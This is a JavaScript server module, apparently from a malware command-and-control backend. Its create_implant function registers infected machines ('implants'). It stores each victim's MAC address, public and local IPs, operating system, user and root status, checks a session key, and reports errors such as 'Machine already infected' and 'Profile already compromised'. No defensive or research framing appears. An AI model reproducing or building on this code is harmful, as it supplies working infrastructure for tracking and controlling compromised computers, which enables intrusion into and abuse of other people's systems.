import Implant from '../models/Implant_model.mjs';
import SessKey from '../models/SessionKey_model.mjs';


const create_implant = async( body ) => {
    let errors=[];

    try {
        const { 
            impl_mac,
            impl_number,
            group,
            public_ip,
            local_ip,
            operating_system,
            impl_id,
            root,
            user,
            sess_key
        } = body;


        const rootBool = root == "True" || root == true ? true : false;

        const data = {
            impl_mac,
            impl_number,
            group,
            public_ip,
            local_ip,
            operating_system,
            impl_id:impl_id.replace('/','-').replace('\\','-').replace(/\s+/g, "").toLowerCase() ,
            root:rootBool,
            user,
            sess_key
        }

        const implan_by_model = await Implant.findOne(data)

        if( !implan_by_model ){
            const new_imp = new Implant(data);
            const found_sessKey = await SessKey.findOne({sess_key:sess_key});
            
            if(!found_sessKey){
                errors.push("Invalid session key");
            }else{
                await new_imp.save();
            }

        }else{
            errors.push("Profile already compromised");
        }

/* 


        const implan_by_model_to_update = await Implant.findOneAndUpdate(
            { impl_id },         
            { $set: {
                impl_mac,
                impl_number,
                group,
                local_ip,
                operating_system,
                root,
                user
            } }, 
            {
                new: true,    
                upsert: true, 
            }
        );
 */

        if(errors.length > 0) return { errors };

        return {errors};
    } catch (error) {
        
        if (error.code === 11000) {
            errors.push("Machine already infected");
            console.log("Machine already infected");
            return {errors, jwt:""};
            
        } else {
            
            errors.push("server error");
            return {errors};
        }

    }
        
}


export { create_implant }